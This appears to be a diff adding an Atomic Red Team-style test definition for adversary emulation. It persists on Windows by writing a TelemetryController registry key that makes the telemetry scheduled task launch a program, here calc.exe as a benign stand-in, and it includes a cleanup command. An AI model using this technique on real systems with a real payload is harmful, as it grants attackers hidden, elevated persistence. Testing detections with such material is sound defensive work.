@@ -1,0 +1,23 @@
+attack_technique: TA0003
+display_name: Abusing Windows Telemetry for Persistence
+
+atomic_tests:
+- name: Hijacking Windows Telemetry scheduled task for persistence
+  auto_generated_guid: e230e05d-2ce0-446e-bea2-217a50b24b7a
+  description: |
+    CompatTelRunner executes a variety of commands which are retrieved from specific registry keys. 
+    it benn has identified that it is feasible to abuse the Windows telemetry mechanism for persistence
+
+  supported_platforms:
+    - windows
+
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Persistence"
+      reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Persistence" /v Command /t REG_SZ /d "C:\Windows\System32\calc.exe"
+      reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Persistence" /v Nightly /t REG_DWORD /d 1
+      schtasks /run /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"
+    cleanup_command: | 
+      reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Persistence" /f
